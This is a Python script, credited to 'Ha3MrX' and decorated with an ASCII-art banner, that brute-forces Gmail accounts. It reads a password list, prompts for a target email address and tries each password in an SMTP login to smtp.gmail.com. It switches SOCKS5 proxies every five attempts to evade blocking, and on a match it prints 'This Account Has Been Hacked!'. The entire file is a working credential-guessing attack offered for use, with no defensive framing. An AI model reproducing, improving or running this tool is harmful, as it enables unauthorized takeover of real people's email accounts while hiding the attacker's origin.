#!/usr/bin/python3
'''create by Ha3MrX'''

import smtplib
import socks
import socket
from os import system
from itertools import cycle

def main():
    print('=================================================')
    print('               create by Ha3MrX                  ')
    print('=================================================')
    print('               ++++++++++++++++++++              ')
    print('\n                                               ')
    print('  _,.                                            ')
    print('                                                 ')
    print('                                                 ')
    print('           HA3MrX                                ')
    print('       _,.                   ')
    print('     ,` -.)                  ')
    print('    ( _/-\\-._               ')
    print('   /,|`--._,-^|            , ')
    print('   \_| |`-._/||          , | ')
    print('     |  `-, / |         /  / ')
    print('     |     || |        /  /  ')
    print('      `r-._||/   __   /  /   ')
    print('  __,-<_     )`-/  `./  /    ')
    print('  \   `---    \   / /  /     ')
    print('     |           |./  /      ')
    print('     /           //  /       ')
    print(' \_/  \         |/  /        ')
    print('  |    |   _,^- /  /         ')
    print('  |    , ``  (\/  /_         ')
    print('   \,.->._    \X-=/^         ')
    print('   (  /   `-._//^`           ')
    print('    `Y-.____(__}             ')
    print('     |     {__)              ') 
    print('           ()   V.1.0        ')

main()

print('[1] Start the attack')
print('[2] Exit')
option = int(input('==> '))
if option == 1:
    file_path = input('Path of passwords file: ')
else:
    system('clear')
    exit()

# Proxy veya IP listesini kullanıcıdan al
print("[1] Provide a proxy list file")
print("[2] Manually enter proxies or IPs")
proxy_option = int(input("==> "))

proxy_list = []

if proxy_option == 1:
    proxy_file = input("Enter the path of the proxy list file: ")
    with open(proxy_file, 'r') as file:
        proxy_list = [line.strip() for line in file.readlines()]
elif proxy_option == 2:
    num_proxies = int(input("How many proxies or IPs will you enter? "))
    for _ in range(num_proxies):
        proxy = input("Enter proxy (format: IP:PORT or IP only): ")
        proxy_list.append(proxy)
else:
    print("Invalid option.")
    exit()

proxy_cycle = cycle(proxy_list)  # Döngüsel olarak proxy seçmek için


def set_proxy(proxy):
    """Socks proxy ayarlarını yapar."""
    proxy_parts = proxy.split(':')
    ip = proxy_parts[0]
    port = int(proxy_parts[1]) if len(proxy_parts) > 1 else 8080
    print(f"Using proxy: {ip}:{port}")
    socks.set_default_proxy(socks.SOCKS5, ip, port)
    socket.socket = socks.socksocket


# Şifre listesi okunuyor
with open(file_path, 'r') as pass_file:
    pass_list = pass_file.readlines()


def login():
    i = 0
    user_name = input('Target email: ')

    for password in pass_list:
        i += 1
        print(f"{i}/{len(pass_list)}")

        # Her 5 istekte bir proxy değiştir
        if i % 5 == 1:
            current_proxy = next(proxy_cycle)
            set_proxy(current_proxy)

        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            server.login(user_name, password.strip())
            system('clear')
            main()
            print('\n')
            print(f'[+] This Account Has Been Hacked! Password: {password.strip()}     ^_^')
            break
        except smtplib.SMTPAuthenticationError as e:
            error = str(e)
            if '<' in error:
                system('clear')
                main()
                print(f'[+] This account has been hacked! Password: {password.strip()}     ^_^')
                break
            else:
                print(f'[!] Password not found => {password.strip()}')
        except Exception as e:
            print(f'[!] Proxy Error or Connection Failed: {e}')


login()